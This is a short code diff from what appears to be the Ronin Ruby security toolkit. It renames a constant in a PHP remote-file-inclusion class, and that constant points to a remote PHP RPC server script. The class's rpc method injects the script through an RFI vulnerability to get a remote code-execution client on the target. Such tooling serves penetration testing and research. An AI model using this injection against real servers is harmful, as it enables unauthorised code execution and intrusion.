@@ -24,7 +24,7 @@ require 'ronin/rpc/php/client'
 module Ronin
   module PHP
     class RFI
-      RPC_SERVER_SCRIPT = 'http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php'
+      RPC_SCRIPT = 'http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php'
 
       #
       # Returns an PHP-RPC Client using the RFI vulnerability to inject
@@ -35,7 +35,7 @@ module Ronin
       #                    Defaults to +RPC_SERVER_SCRIPT+.
       #
       def rpc(options={})
-        server_script = (options[:server] || RPC_SERVER_SCRIPT)
+        server_script = (options[:server] || RPC_SCRIPT)
 
         return RPC::PHP::Client.new(url_for(server_script),options)
       end
